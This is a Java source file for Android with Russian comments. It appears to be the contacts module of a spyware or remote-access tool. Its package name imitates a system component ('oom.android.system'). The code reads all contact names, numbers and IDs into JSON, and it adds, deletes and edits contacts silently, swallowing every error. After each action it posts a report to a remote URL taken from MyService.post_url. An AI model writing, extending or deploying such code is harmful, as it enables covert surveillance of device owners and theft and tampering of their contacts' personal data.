package oom.android.system.Managers.Contacts;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;

import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import oom.android.system.Managers.base;
import oom.android.system.app.HttpPoster;
import oom.android.system.app.MyService;


public class ContactsManager {

    public static JSONObject getContacts(Context context){

        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER,ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                MContact Mcontact = new MContact();
                Mcontact.setName(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                Mcontact.setPhone(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                Mcontact.setId(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID)));

                contact.put(base.CONTACTS.CONTACT_PHONE, Mcontact.getPhone());
                contact.put(base.CONTACTS.CONTACT_NAME, Mcontact.getName());
                contact.put(base.CONTACTS.CONTACT_ID,Mcontact.getId());
                list.put(contact);

            }
            contacts.put("contactsList", list);
            cur.close();
            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Список обновлён");
            new Thread(uploader).start();
            return contacts;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

    public static void AddContact(String name,String phone){
        try{
            Uri rawContactUri = MyService.getContext().getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, new ContentValues());

            long rawContactId =  ContentUris.parseId(rawContactUri);

            ContentValues values = new ContentValues();

            /* Связываем наш аккаунт с данными */
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            /* Устанавливаем MIMETYPE для поля данных */
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
            /* Имя для нашего аккаунта */
            values.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name);


            MyService.getContext().getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);

            values.clear();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            /* Тип данных – номер телефона */
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
            /* Номер телефона */
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, phone);
            /* Тип – мобильный */
            values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);

            MyService.getContext().getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);

            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Контакт добавлен");
            new Thread(uploader).start();
        }catch (Exception e){}

    }

    public static void DeleteContact(String RawId,String name) {
        try{

            String wh = ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY+"=? AND "+ ContactsContract.RawContacts._ID+"=?";
            String[] args = new String[]{name,RawId};
            MyService.getContext().getContentResolver().delete(ContactsContract.RawContacts.CONTENT_URI,wh, args);
            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Контакт удален");
            new Thread(uploader).start();
        }catch (Exception e){}

    }

    public static void UpdateContact(String RawId,String name,String phone, String N_name, String N_phone){
        updateP(phone,N_phone);
        updateN(name,N_name);
        //updateR(RawId,name,N_name);

    }

    private static void updateP(String phone,String N_phone){
        try{
            ContentResolver resolver = MyService.getContext().getContentResolver();

            ContentValues values = new ContentValues();

            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER,N_phone);

            String wh=ContactsContract.CommonDataKinds.Phone.NUMBER +"=?";
            String[] args = new String[]{phone};
            resolver.update(ContactsContract.Data.CONTENT_URI,values,wh,args);

            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Номер изменён");
            new Thread(uploader).start();
        }catch (Exception e){}

    }

    private static void updateN(String name,String N_name){
        try{
            ContentResolver resolver = MyService.getContext().getContentResolver();

            ContentValues values = new ContentValues();

            values.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME,N_name);
            String wh = ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME+"=?";
            String[] args = new String[]{name};

            resolver.update(ContactsContract.Data.CONTENT_URI,values,wh,args);

        }catch (Exception e){}

    }

    /*private static void updateR(String RawId,String name,String N_name){
        try{
            ContentResolver resolver = MyService.getContext().getContentResolver();
         String[] projection = new String[]{ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY,ContactsContract.RawContacts._ID};

        String Raw_id = "";

        Cursor c = resolver.query(ContactsContract.RawContacts.CONTENT_URI,projection,null,null,null);
        if(c != null){
            while (c.moveToNext()){
                final int colId = c.getColumnIndex(ContactsContract.RawContacts._ID);
                final int colName = c.getColumnIndex(ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY);
                do{
                    String Name = c.getString(colName);
                    String Id = c.getString(colId);
                    Log.d("MYLOG",Name +" ; "+Id);
                    if(Name.equals(name)){
                        Raw_id = Id;
                    }

                }while (c.moveToNext());
            }
        }
        c.close();

            String wh = ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY+"=? AND "+ ContactsContract.RawContacts._ID+"=?";
            String[] args = new String[]{name,RawId};
            ContentValues values = new ContentValues();
            values.put(ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY, N_name);


            resolver.update(ContactsContract.RawContacts.CONTENT_URI,values,wh, args);
            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Имя измененно");
            new Thread(uploader).start();
        }catch (Exception e){}

    }*/


}
